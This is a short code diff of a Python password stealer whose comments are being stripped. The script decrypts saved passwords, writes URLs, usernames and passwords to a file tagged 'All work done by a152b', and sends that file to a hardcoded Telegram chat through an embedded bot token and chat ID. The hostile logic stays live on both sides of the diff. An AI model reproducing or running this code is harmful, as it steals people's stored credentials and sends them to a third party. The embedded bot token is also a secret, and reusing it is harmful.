@@ -9,13 +9,12 @@ from cryptography.hazmat.backends import default_backend
 from telegram import Bot
 import asyncio
 
-TELEGRAM_BOT_TOKEN = '7558492008:AAE1ZrjixCRDGxRQaRhmkvXpJpADeIgX2gw'  # Замените на токен вашего бота
-CHAT_ID = '874924103'  # Замените на ваш ID
-
+TELEGRAM_BOT_TOKEN = '7558492008:AAE1ZrjixCRDGxRQaRhmkvXpJpADeIgX2gw'
+CHAT_ID = '874924103'
 async def send_passwords_to_telegram(file_path):
     bot = Bot(token=TELEGRAM_BOT_TOKEN)
     
-    # Отправка файла
+
     with open(file_path, 'rb') as file:
         await bot.send_document(chat_id=CHAT_ID, document=file)
 
@@ -69,7 +68,6 @@ def decrypt_password(ciphertext):
 
 def save_passwords_to_file(passwords, file_path):
     with open(file_path, 'w', encoding='utf-8') as file:
-        # Записываем текст в начало файла
         file.write("All work done by a152b\n\n")
         for url, username, password in passwords:
             file.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
